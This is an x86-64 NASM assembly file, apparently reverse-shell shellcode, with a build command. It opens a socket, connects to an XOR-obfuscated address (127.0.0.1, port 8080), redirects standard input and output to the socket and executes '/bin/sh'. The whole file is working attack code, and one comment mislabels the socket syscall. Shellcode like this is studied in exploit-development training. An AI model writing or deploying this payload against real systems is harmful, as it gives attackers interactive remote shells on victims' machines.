; compile : nasm -f elf64 reverser_shellcode_optimized_64.asm && ld reverser_shellcode_optimized_64.o -o reverseshell
global      _start
_start:
; We first need to create a socket
; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
    mov         al, 0x29        ; socketcall (102)
    push        0x2
    pop         rdi
    push        0x1
    pop         rsi
    xor         rdx, rdx
    syscall                     ; execute
    mov         r9, rax

; Then connect to ip and port
    xchg        rdi, rax
    xor         rcx, rcx
    mov         ebx, 0xfeffff80
    xor         ebx, 0xffffffff
    push        rcx
    push        rcx
    push        rbx
    push        word 0x901F
    push        word 0x2
    mov         rsi, rsp
    push        byte 0x10
    pop         rdx

    mov         rbx, rdi
    mov         al, 0x2a
    syscall

; Get input and redirect output
    push        byte 0x02
    pop         rsi
    mov         rdi, r9

loop:
    push        0x21
    pop         rax
    syscall
    dec         rsi
    jns         loop

; Execute a shell
    xor         rdx, rdx
    push        rdx
    push        rdx
    mov         rbx, 0x68732f6e69622f2f
    push        rbx
    mov         rdi, rsp
    push        rdx
    push        rdi
    mov         rsi, rsp
    
    mov         al, 0x3b
    syscall

    xor         rbx, rbx
    xor         rax, rax
    mov         al, 0x3c
    syscall
